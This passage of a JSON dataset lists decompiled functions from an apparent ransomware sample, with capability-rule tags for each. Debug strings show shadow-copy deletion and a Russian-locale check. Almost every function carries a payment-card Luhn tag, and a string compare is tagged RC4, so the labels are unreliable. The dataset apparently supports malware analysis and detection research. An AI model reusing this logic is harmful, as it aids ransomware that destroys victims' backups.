        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004049c3(void)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_8h;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_ch;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = fcn.00405e1e(3, 0xd);\n    arg_8h = uVar2;\n    if ((uVar2 != 0) && (arg_8h = fcn.00405197(uVar2 * 2 + 10),  arg_8h != 0)) {\n        var_4h = 0;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = fcn.00405e1e(0, 1);\n                arg_ch = 9;\n                if (iVar3 != 0) {\n                    arg_ch = 0x19;\n                }\n                iVar1 = fcn.00405e1e(0, arg_ch);\n                *(arg_8h + var_4h * 2) = iVar1 + *(iVar3 * 2 + 0x40f070);\n                var_4h = var_4h + 1;\n            } while (var_4h < uVar2);\n        }\n        fcn.00406625(0x413060, 0x9a6, 0xc, 8, &var_10h);\n        var_8h._0_2_ = 0;\n        fcn.00406af4(arg_8h, &var_10h);\n        iVar3 = fcn.00406195();\n        if (iVar3 == 0) {\n            fcn.004051e4(arg_8h);\n        }\n        else {\n            iVar4 = fcn.00406ca4(iVar3);\n            iVar5 = fcn.00406ca4(arg_8h);\n            uVar2 = fcn.00405197((iVar4 + iVar5) * 2 + 2);\n            if (uVar2 != 0) {\n                fcn.00406bfb(uVar2, iVar3);\n                fcn.00406af4(uVar2, arg_8h);\n                return uVar2;\n            }\n            fcn.004051e4(arg_8h);\n            fcn.004051e4(iVar3);\n        }\n        arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 578
    },
    "00404d06": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404d06(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    ulong uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(arg_8h + 2);\n    iVar2 = (*_sym.imp.KERNEL32.dll_QueryPerformanceFrequency)(arg_8h + 4);\n    if (iVar2 == 0) {\n        arg_8h[10] = 0;\n        arg_8h[0xb] = 0;\n        *(arg_8h + 8) = 0;\n    }\n    else {\n        uVar1 = arg_8h[2];\n        _var_8h = CONCAT44((arg_8h[3] - arg_8h[1]) - (uVar1 < *arg_8h), uVar1 - *arg_8h);\n        *(arg_8h + 8) = _var_8h / (*(arg_8h + 4) / *0x40fc30);\n        uVar4 = fcn.0040deb0();\n        arg_8h[10] = uVar4;\n        arg_8h[0xb] = uVar4 >> 0x20;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(arg_8h[6]);\n        (*_sym.imp.KERNEL32.dll_SetThreadAffinityMask)(uVar3);\n        uVar3 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(10, L\"[INF] \", uVar3);\n        uVar3 = fcn.0040dd90();\n        fcn.00405082(2, L\"TIMING: result = %llu:%02llu:%.3f\\r\\n\", uVar3);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    }\n    return;\n}\n",
        "token_count": 462
    },
    "00404ddf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ddf(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint arg_10h;\n    \n    arg_10h = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uVar1 = 10;\n    fcn.00405082(10, L\"[INF] \", arg_10h);\n    fcn.00405082(2, L\"TIMING: start...\\r\\n\", uVar1);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_SetThreadAffinityMask)(uVar1);\n    *(arg_8h + 0x18) = uVar1;\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(arg_8h);\n    return;\n}\n",
        "token_count": 212
    },
    "00405082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405082(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t lpOutputString;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20000);\n    lpOutputString = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if (lpOutputString != 0) {\n        (**0x421354)(lpOutputString, 0x10000, arg_ch, &arg_10h);\n        fcn.004050d2(lpOutputString, arg_8h);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpOutputString);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "004050d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "print debug messages",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004050d2(uint lpOutputString, uint wAttributes)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(lpOutputString);\n    uVar3 = 0;\n    puVar2 = &var_4h;\n    iVar1 = fcn.00406ca4(lpOutputString);\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(*0x421360, lpOutputString, iVar1 * 2, puVar2, uVar3);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_SetConsoleTextAttribute)(*0x421358, wAttributes),  iVar1 != 0))\n    {\n        uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpOutputString, &var_4h, 0);\n        uVar3 = (*_sym.imp.KERNEL32.dll_WriteConsoleW)(*0x421358, lpOutputString, uVar3);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 257
    },
    "004053f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004053f8(void)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint arg_10h_00;\n    uint var_174h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_3eh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    arg_10h = 7;\n    fcn.00405082(7, L\"[DBG] \", arg_10h_00);\n    fcn.00405082(8, L\"delete shadow copy\\r\\n\", arg_10h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    fcn.00406625(0x420aa0, 0x55a, 0x10, 0xe, &var_4ch);\n    var_3eh._0_2_ = 0;\n    fcn.00406625(0x420aa0, 0x15b, 0xb, 0x124, &var_174h);\n    stack0xffffffc0 = 0x3c;\n    var_50h._0_2_ = 0;\n    var_38h = 0;\n    var_34h = (**0x413d68)();\n    var_2ch = &var_4ch;\n    var_28h = &var_174h;\n    var_30h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    var_4h = 0;\n    do {\n        iVar1 = (**0x413cac)(&var_3eh + 2);\n    } while (iVar1 == 0);\n    return;\n}\n",
        "token_count": 555
    },
    "0040587c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040587c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_10h;\n    uint uVar3;\n    uint var_58h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00405197(0x22);\n    if (iVar1 != 0) {\n        var_4h = fcn.004060e0();\n        uVar2 = fcn.00407642(0x539, &var_4h, 4);\n        fcn.0040524d(&var_58h, 0, 0x40);\n        fcn.004053a4(&var_58h);\n        fcn.00406625(0x420aa0, 0x502, 0xe, 0x10, &var_18h);\n        var_8h._0_2_ = 0;\n        uVar3 = var_4h;\n        arg_10h = fcn.00406c91(&var_58h);\n        uVar2 = fcn.00407642(uVar2, &var_58h, arg_10h);\n        (**0x413e44)(iVar1, &var_18h, uVar2, uVar3);\n    }\n    return iVar1;\n}\n",
        "token_count": 315
    },
    "0040591a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040591a(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    var_8h = arg_8h;\n    fcn.00405d77(1, &var_8h, fcn.00405332);\n    return var_4h;\n}\n",
        "token_count": 86
    },
    "004059f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004059f5(void)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00406625(0x420aa0, 0x491, 7, 0x18, &var_20h);\n    var_8h._0_2_ = 0;\n    uVar2 = (**0x413df0)();\n    iVar3 = fcn.00405750(uVar2);\n    if (iVar3 == 0x4000) {\n        uVar2 = fcn.0040591a(&var_20h);\n        iVar3 = (**0x413df4)(0x2000000, 0, uVar2);\n        if (iVar3 != 0) {\n            iVar4 = (**0x413e08)(iVar3, 0xf01ff, &var_4h);\n            if (iVar4 != 0) {\n                iVar4 = (**0x413d44)(var_4h);\n                fcn.0040536d(iVar3);\n                fcn.0040536d(var_4h);\n                return iVar4 != 0;\n            }\n            fcn.0040536d(iVar3);\n        }\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    return bVar1;\n}\n",
        "token_count": 337
    },
    "00405b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00405b24(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_4h;\n    \n    uVar5 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uVar4 = 7;\n    fcn.00405082(7, L\"[DBG] \", uVar5);\n    fcn.00405082(8, L\"check RU speak..\\r\\n\", uVar4);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    fcn.0040527b();\n    iVar3 = 0;\n    iVar1 = (**0x413c1c)(0, 0);\n    if ((iVar1 != 0) && (arg_8h = fcn.00405197(iVar1 << 2),  arg_8h != 0)) {\n        iVar2 = (**0x413c1c)(iVar1, arg_8h);\n        if ((iVar2 != 0) && (0 < iVar1)) {\n            do {\n                iVar2 = fcn.00405c0e(*(arg_8h + iVar3 * 4));\n                if ((iVar2 != 0) && (extraout_ECX != 0)) {\n                    uVar5 = 0x4216a0;\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                    uVar4 = 0xc;\n                    fcn.00405082(0xc, L\"[ERR] \", uVar5);\n                    fcn.00405082(4, L\"!!! IS RU !!!\\r\\n\", uVar4);\n                    fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\core\\\\src\\\\common\\\\system.c\");\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                    return 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < iVar1);\n        }\n        fcn.004051e4(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 506
    },
    "00405c0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405c0e(uint arg_8h)\n\n{\n    if (arg_8h - 0x18 < 0x2d) {\n    // switch table (45 cases) at 0x405c36\n        switch(*(*(arg_8h + 0x405c26) * 4 + 0x405c36)) {\n        case 0x405c2b:\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 108
    },
    "00405c9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405c9d(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040538f(&var_4h);\n    if (iVar1 != 0) {\n        iVar4 = 1;\n        if (var_4h < 2) {\n            (**0x413c84)(iVar1);\n            iVar1 = 0;\n        }\n        else {\n            iVar3 = 0;\n            if (1 < var_4h) {\n                do {\n                    iVar2 = fcn.00406ca4(*(iVar1 + iVar4 * 4));\n                    iVar3 = iVar3 + 1 + iVar2;\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < var_4h);\n                iVar4 = 1;\n                if (iVar3 != 0) {\n                    iVar3 = fcn.00405197(iVar3 * 2);\n                    if ((iVar3 != 0) && (1 < var_4h)) {\n                        do {\n                            fcn.00406af4(iVar3, *(iVar1 + iVar4 * 4));\n                            fcn.00406af4(iVar3, 0x40fb28);\n                            iVar4 = iVar4 + 1;\n                        } while (iVar4 < var_4h);\n                    }\n                    (**0x413c84)(iVar1);\n                    return iVar3;\n                }\n            }\n            (**0x413c84)(iVar1);\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 368
    },
    "004060e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004060e0(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_8h = fcn.00406491();\n    if (arg_8h == 0) {\n        uVar2 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", uVar2);\n        uVar2 = (**0x413d60)();\n        fcn.00405082(8, L\"win_dir() last error = %08X\\r\\n\", uVar2);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        var_4h = 0;\n    }\n    else {\n        *(arg_8h + 6) = 0;\n        iVar1 = (**0x413c68)(arg_8h, 0, 0, &var_4h, 0, 0, 0, 0);\n        if (iVar1 == 0) {\n            uVar2 = 0x4216a0;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n            fcn.00405082(7, L\"[DBG] \", uVar2);\n            uVar2 = (**0x413d60)();\n            fcn.00405082(8, L\"GetVolumeInformationW() last error = %08X\\r\\n\", uVar2);\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n            var_4h = 0;\n        }\n        fcn.004051e4(arg_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 389
    },
    "00406582": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406582(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0x40000000;\n    if (arg_10h != 0) {\n        uVar2 = 0;\n    }\n    arg_8h_00 = (**0x413cf8)(arg_8h, arg_ch, uVar2 | 1, 0, &arg_10h);\n    if (((arg_8h_00 != 0) && (arg_8h_00 = fcn.00405197(arg_10h * 2),  arg_8h_00 != 0)) &&\n       (iVar1 = (**0x413cf8)(arg_8h, arg_ch, uVar2 | 1, arg_8h_00, &arg_10h),  iVar1 == 0)) {\n        fcn.004051e4(arg_8h_00);\n        arg_8h_00 = 0;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 265
    },
    "00406625": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406625(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004077f8(arg_8h + arg_ch, arg_10h, arg_8h + arg_ch + arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 93
    },
    "00406686": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406686(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t arg_10h_00;\n    int32_t arg_ch_00;\n    \n    arg_10h_00 = fcn.00405197(arg_ch * 2 + 1);\n    if (arg_10h_00 != 0) {\n        fcn.00406647(arg_8h, arg_ch, arg_10h_00);\n        arg_ch_00 = fcn.004064cf(arg_10h_00);\n        fcn.004051e4(arg_10h_00);\n        if (arg_ch_00 != 0) {\n            fcn.00405228(arg_10h, arg_ch_00, arg_ch << 2);\n            fcn.004051e4(arg_ch_00);\n        }\n        arg_10h_00 = arg_ch_00 != 0;\n    }\n    return arg_10h_00;\n}\n",
        "token_count": 223
    },
    "00406720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406720(uint arg_8h, uint arg_ch, uint arg_10h, code *arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00406f41(arg_8h, &arg_ch, &var_4h);\n    while (iVar1 != 0) {\n        (*arg_14h)(arg_10h, iVar1);\n        arg_8h_00 = arg_8h;\n        if (iVar1 != 0) {\n            arg_8h_00 = 0;\n        }\n        iVar1 = fcn.00406f41(arg_8h_00, &arg_ch, &var_4h);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "0040676b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040676b(uint arg_8h, uint arg_ch, uint arg_10h, code *arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00406fdb(arg_8h, &arg_ch, &var_4h);\n    while (iVar1 != 0) {\n        (*arg_14h)(arg_10h, iVar1);\n        arg_8h_00 = arg_8h;\n        if (iVar1 != 0) {\n            arg_8h_00 = 0;\n        }\n        iVar1 = fcn.00406fdb(arg_8h_00, &arg_ch, &var_4h);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "004067fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004067fa(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = *arg_8h;\n    while( true ) {\n        if (uVar2 == 0) {\n            return 1;\n        }\n        puVar1 = arg_8h + 1;\n        if (*puVar1 == 0x2a) {\n            uVar3 = fcn.0040686b(*arg_8h, arg_8h + 2, arg_ch);\n            return uVar3;\n        }\n        if ((uVar2 == 0x24) && (*puVar1 == 0)) {\n            return *arg_ch == 0;\n        }\n        if ((*arg_ch == 0) || ((uVar2 != 0x2e && (uVar2 != *arg_ch)))) break;\n        arg_ch = arg_ch + 1;\n        uVar2 = *puVar1;\n        arg_8h = puVar1;\n    }\n    return 0;\n}\n",
        "token_count": 257
    },
    "0040686b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040686b(uint arg_8h, uint arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    do {\n        iVar2 = fcn.004067fa(arg_ch, arg_10h);\n        if (iVar2 != 0) {\n            return 1;\n        }\n        iVar1 = *arg_10h;\n    } while ((iVar1 != 0) && ((arg_10h = arg_10h + 1,  iVar1 == arg_8h || (arg_8h == 0x2e))));\n    return 0;\n}\n",
        "token_count": 146
    },
    "004068c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004068c8(uint16_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    \n    puVar3 = arg_8h;\n    do {\n        uVar1 = *arg_8h;\n        *puVar3 = uVar1;\n        iVar2 = fcn.00406701(uVar1);\n        if (iVar2 == 0) {\n            puVar3 = puVar3 + 1;\n        }\n        uVar1 = *arg_8h;\n        arg_8h = arg_8h + 1;\n    } while (uVar1 != 0);\n    return;\n}\n",
        "token_count": 158
    },
    "004068f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004068f5(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_10h != 0) {\n        do {\n            iVar1 = fcn.00406936(arg_8h, *(arg_ch + uVar2 * 8), *(arg_ch + 4 + uVar2 * 8));\n            if (iVar1 != 0) {\n                fcn.004051e4(arg_8h);\n                arg_8h = iVar1;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 184
    },
    "00406a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a50(uint16_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    \n    uVar1 = *arg_8h;\n    while (uVar1 != 0) {\n        uVar1 = *arg_8h;\n        if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n            *arg_8h = uVar1 | 0x20;\n        }\n        arg_8h = arg_8h + 1;\n        uVar1 = *arg_8h;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00406aa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406aa4(uint16_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    \n    uVar1 = *arg_8h;\n    while (uVar1 != 0) {\n        uVar1 = *arg_8h;\n        if ((0x60 < uVar1) && (uVar1 < 0x7b)) {\n            *arg_8h = uVar1 & 0xffdf;\n        }\n        arg_8h = arg_8h + 1;\n        uVar1 = *arg_8h;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00406ad5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406ad5(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406c91(arg_8h);\n    fcn.00406bdb(iVar1 + arg_8h, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 77
    },
    "00406b33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00406b33(int16_t *arg_8h, uint arg_ch)\n\n{\n    while( true ) {\n        if (*arg_8h == 0) {\n            if (*arg_8h != arg_ch) {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        if (*arg_8h == arg_ch) break;\n        arg_8h = arg_8h + 1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 114
    },
    "00406b9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406b9a(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = *arg_ch;\n    iVar1 = *arg_8h - uVar3;\n    if (iVar1 == 0) {\n        iVar2 = arg_8h - arg_ch;\n        do {\n            if (uVar3 == 0) break;\n            arg_ch = arg_ch + 1;\n            uVar3 = *arg_ch;\n            iVar1 = *(iVar2 + arg_ch) - uVar3;\n        } while (iVar1 == 0);\n    }\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    else if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 205
    },
    "00406bdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406bdb(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406c91(arg_ch);\n    fcn.00405228(arg_8h, arg_ch, iVar1 + 1);\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "00406bfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406bfb(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406ca4(arg_ch);\n    fcn.00405228(arg_8h, arg_ch, iVar1 * 2 + 2);\n    return arg_8h;\n}\n",
        "token_count": 76
    },
    "00406cbd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406cbd(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    if (arg_10h != 0) {\n        if ((3 < arg_10h) && (puVar1 = arg_8h,  puVar2 = arg_ch,  arg_10h != 4)) {\n            do {\n                arg_8h = puVar1 + 4;\n                arg_ch = puVar2 + 4;\n                if ((*puVar1 == 0) || (*puVar1 != *puVar2)) {\n                    uVar4 = *puVar1;\n                    uVar3 = *puVar2;\n                    goto code_r0x00406d71;\n                }\n                if ((puVar1[1] == 0) || (puVar1[1] != puVar2[1])) {\n                    uVar4 = puVar1[1];\n                    uVar3 = puVar2[1];\n                    goto code_r0x00406d71;\n                }\n                if ((puVar1[2] == 0) || (puVar1[2] != puVar2[2])) {\n                    uVar4 = puVar1[2];\n                    uVar3 = puVar2[2];\n                    goto code_r0x00406d71;\n                }\n                if ((puVar1[3] == 0) || (puVar1[3] != puVar2[3])) {\n                    uVar4 = puVar1[3];\n                    uVar3 = puVar2[3];\n                    goto code_r0x00406d71;\n                }\n                uVar4 = uVar4 + 4;\n                puVar1 = arg_8h;\n                puVar2 = arg_ch;\n            } while (uVar4 < arg_10h - 4);\n        }\n        for (; uVar4 < arg_10h; uVar4 = uVar4 + 1) {\n            if ((*arg_8h == 0) || (*arg_8h != *arg_ch)) {\n                uVar4 = *arg_8h;\n                uVar3 = *arg_ch;\ncode_r0x00406d71:\n                return uVar4 - uVar3;\n            }\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 575
    },
    "00406d75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406d75(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != 0)) && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1)\n        {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return arg_10h;\n}\n",
        "token_count": 145
    },
    "00406dad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
